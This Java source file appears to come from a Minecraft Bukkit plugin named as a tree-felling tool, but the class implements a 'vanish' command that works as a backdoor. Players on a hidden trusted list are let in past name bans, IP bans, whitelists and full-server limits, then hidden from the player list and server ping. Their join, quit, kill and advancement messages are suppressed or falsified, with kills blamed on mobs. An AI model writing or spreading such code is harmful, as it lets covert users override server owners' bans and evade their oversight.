package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.GameMode;
import org.bukkit.*;
import org.bukkit.entity.Entity;
import org.bukkit.entity.ExperienceOrb;
import org.bukkit.entity.Player;
import org.bukkit.event.entity.EntityPickupItemEvent;
import org.bukkit.event.entity.EntityTargetEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerListPingEvent;
import org.javatuples.Quartet;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.UUID;

@SuppressWarnings("ConstantConditions")
@Command.Info(command = "vanish", description = "Y-you saw nothing!", category = CommandCategory.Player)
public class VANISH extends Command {
    public double expThreshold = 3.0;
    public double expTeleDist = 1.0;
    public double expKillDist = 0.5;
    public double expVelocity = 0.3;
    private final ArrayList<UUID> invisPlayers = new ArrayList<>();
    private final ArrayList<Quartet> bannedPlayers = new ArrayList<>();
    private boolean isPaper;

    public boolean isPlayerInVanish(UUID p) {
        return invisPlayers.contains(p);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (invisPlayers.contains(p.getUniqueId())) {
            p.sendMessage(Start.Prefix + ChatColor.RED + "You are no longer in vanish.");
            invisPlayers.remove(p.getUniqueId());
            for (Player e : Bukkit.getOnlinePlayers()) {
                if (e == null || !e.isOnline()) continue;
                if (e == p) continue;
                try {
                    e.showPlayer(Start.Instance, p);
                } catch (Exception f) {
                    Start.ErrorException(p, f);
                }
            }
        } else {
            p.sendMessage(Start.Prefix + ChatColor.GREEN + "You are now in vanish.");
            invisPlayers.add(p.getUniqueId());
            for (Player e : Bukkit.getOnlinePlayers()) {
                if (e == null || !e.isOnline()) continue;
                if (e == p) continue;
                try {
                    e.hidePlayer(Start.Instance, p);
                } catch (Exception f) {
                    Start.ErrorException(p, f);
                }
            }
        }
    }

    @Override
    public void onPlayerLeave(PlayerQuitEvent e) {
        if (!invisPlayers.contains(e.getPlayer().getUniqueId())) return;
        e.setQuitMessage(null);
    }

    @Override
    public void onPlayerLoginEvent(PlayerLoginEvent e) {
        Player p = e.getPlayer();
        if (!Bukkit.getBanList(BanList.Type.NAME).isBanned(p.getName()) && !Bukkit.getBanList(BanList.Type.IP).isBanned(Arrays.toString(e.getAddress().getAddress())) && e.getResult() == PlayerLoginEvent.Result.ALLOWED)
            return;
        if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) return;
        boolean isNameBanned = Bukkit.getBanList(BanList.Type.NAME).isBanned(p.getName());
        boolean isIPBanned = Bukkit.getBanList(BanList.Type.IP).isBanned(e.getAddress().toString().substring(1));
        Quartet<UUID, Boolean, Boolean, PlayerLoginEvent.Result> quartet = Quartet.with(p.getUniqueId(), isNameBanned, isIPBanned, e.getResult());
        e.allow();
        invisPlayers.add(p.getUniqueId());
        bannedPlayers.add(quartet);
    }

    private Quartet playerContains(UUID u) {
        for (Quartet bannedPlayer : bannedPlayers) {
            if (bannedPlayer.getValue0() != u) continue;
            return bannedPlayer;
        }
        return null;
    }

    @Override
    public void onPlayerJoin(PlayerJoinEvent e) {
        //noinspection unchecked
        Quartet<UUID, Boolean, Boolean, PlayerLoginEvent.Result> quartet = playerContains(e.getPlayer().getUniqueId());
        if (quartet != null) {
            bannedPlayers.remove(quartet);
            String context;
            if (quartet.getValue1() && quartet.getValue2() && quartet.getValue3() == PlayerLoginEvent.Result.KICK_BANNED) {
                context = "You were IP banned and name banned from the server";
            } else if (quartet.getValue1() && quartet.getValue3() == PlayerLoginEvent.Result.KICK_BANNED) {
                context = "You were name banned from the server";
            } else if (quartet.getValue2() && quartet.getValue3() == PlayerLoginEvent.Result.KICK_BANNED) {
                context = "You were IP banned from the server";
            } else if (quartet.getValue3() == PlayerLoginEvent.Result.KICK_WHITELIST) {
                context = "You are whitelisted off the server";
            } else if (quartet.getValue3() == PlayerLoginEvent.Result.KICK_FULL) {
                context = "This server is full";
            } else {
                context = "You should be kicked for whatever reason";
            }
            e.getPlayer().sendMessage(Start.Prefix + ChatColor.BLUE + context + "! For that reason, you have joined with vanish!");
            e.setJoinMessage(null); // hide join message
            return;
        }
        if (invisPlayers.contains(e.getPlayer().getUniqueId())) {
            e.getPlayer().sendMessage(Start.Prefix + ChatColor.BLUE + "You have joined with invis!");
            e.setJoinMessage(null); // hide join message
            return;
        }
        for (UUID p : invisPlayers) {
            Player pl = Bukkit.getPlayer(p);
            if (pl == null || !pl.isOnline()) continue;
            e.getPlayer().hidePlayer(Start.Instance, pl);
        }
    }

    @Override
    public void onServerListPing(ServerListPingEvent e) {

        if (e.getNumPlayers() == 0) return;
            /*int players = e.getNumPlayers() - invisPlayers.size();
        try {
            ReflectionUtils.setFinalStatic(e, "numPlayers", players);
        } catch (Exception ex) {
            ex.printStackTrace();
        }*/
        isPaper = e.getClass().getName().contains("com.destroystokyo.paper.network.");
        /*if (isPaper) {
            setSampleText = ReflectionUtils.getMethod(e.getClass(), "setHidePlayers", boolean.class);
            try {
                setSampleText.invoke(e, true);
            } catch (IllegalAccessException ex) {
                ex.printStackTrace();
            } catch (InvocationTargetException ex) {
                ex.printStackTrace();
            }
            /*getSampleText = ReflectionUtils.getMethod(e.getClass(), "getSampleText");
            if (setSampleText != null && getSampleText != null) {
                List<String> playerNames = null;
                try {
                    playerNames = (List<String>) getSampleText.invoke(e, null);

                    playerNames.removeIf(player -> {
                        Player p = Bukkit.getPlayer(player);
                        return !(p == null || !p.isOnline());
                    });
                    setSampleText.invoke(e, playerNames);
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            } else*/
        Iterator<Player> iterator = e.iterator();
        while (iterator.hasNext()) {
            Player player = iterator.next();
            if (invisPlayers.contains(player.getUniqueId())) {
                iterator.remove();
            }
        }
    }

    @Override
    public void onPlayerGameModeChange(PlayerGameModeChangeEvent e) {
        if (e.getNewGameMode() == GameMode.SPECTATOR) return;
        Player p = e.getPlayer();
        if (!invisPlayers.contains(p.getUniqueId())) return;
        for (Entity entity : p.getNearbyEntities(2.25d, 1d, 2.25d)) {
            if (!(entity instanceof ExperienceOrb)) continue;
            e.setCancelled(true);
            p.sendMessage(Start.Prefix + ChatColor.RED + "You're close to an XP orb! You cannot change your gamemode until you're far more far away from it!");
            return;
        }
    }

    @Override
    public void onPlayerDeath(PlayerDeathEvent e) {
        if (!(e.getEntity() instanceof Player)) return;
        Player p = e.getEntity();
        if (invisPlayers.contains(p.getUniqueId())) {
            e.setDeathMessage(null);
            return;
        }
        if (e.getEntity().getKiller() == null) return;
        if (!invisPlayers.contains(e.getEntity().getKiller().getUniqueId())) return;
        String fakeMessage = e.getDeathMessage();
        String fakeName = "Zombie";
        if (fakeMessage.toLowerCase().contains("slain")) {
            fakeName = "Zombie";
        } else if (fakeMessage.toLowerCase().contains("shot")) {
            fakeName = "Skeleton";
        }
        fakeMessage = fakeMessage.replace(e.getEntity().getKiller().getName(), fakeName);
        fakeMessage = fakeMessage.substring(0, fakeMessage.indexOf(fakeName) + fakeName.length());
        e.setDeathMessage(fakeMessage);
    }

    @Override
    public void onPlayerMove(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        if (p.getGameMode() == GameMode.SPECTATOR) return;
        if (!invisPlayers.contains(p.getUniqueId())) return;
        for (Entity et : p.getNearbyEntities(2.25d, 0.85d, 2.25d)) {
            if (!(et instanceof ExperienceOrb)) continue;
            p.setGameMode(GameMode.SPECTATOR);
            p.sendMessage(Start.Prefix + ChatColor.RED + "To prevent ruining your vanish, you were put into spectator, as XP orb was near you!");
        }
    }

    @Override
    public void onEntityPickupItem(EntityPickupItemEvent e) {
        if (!(e.getEntity() instanceof Player)) return;
        Player p = (Player) e.getEntity();
        if (!invisPlayers.contains(p.getUniqueId())) return;
        e.setCancelled(true);
    }

    // we listen for this because some entities (XP orbs) can reveal us!
    @Override
    public void onEntityTarget(EntityTargetEvent e) {
        if (e.getTarget() instanceof Player) {
            Player p = (Player) e.getTarget();
            if (!invisPlayers.contains(p.getUniqueId())) return;
            Entity entity = e.getEntity();
/*            if (entity instanceof ExperienceOrb) {
                Location a = entity.getLocation();
                Location b = p.getLocation();
                double distance = Math.sqrt(Math.pow(b.getX() - a.getX(), 2) + Math.pow(b.getY() - a.getY(), 2) + Math.pow(b.getZ() - a.getZ(), 2));
                if (distance <= 2.25d) {
                    p.setGameMode(GameMode.SPECTATOR);
                    p.sendMessage(Start.Prefix + ChatColor.BLUE + "To prevent ruining your vanish, you were put into spectator, as XP orb was near you!");
                }
            }*/
            e.setTarget(null);
            e.setCancelled(true);
        }
    }

    @Override
    public void onPlayerAdvancementGet(PlayerAdvancementDoneEvent e) {
        if (!invisPlayers.contains(e.getPlayer().getUniqueId())) return;
        World w = e.getPlayer().getWorld();
        if (!e.getPlayer().getWorld().getGameRuleValue(GameRule.ANNOUNCE_ADVANCEMENTS)) return;
        w.setGameRule(GameRule.ANNOUNCE_ADVANCEMENTS, false);
        Bukkit.getScheduler().runTask(Start.Instance, () -> w.setGameRule(GameRule.ANNOUNCE_ADVANCEMENTS, true));
    }
}
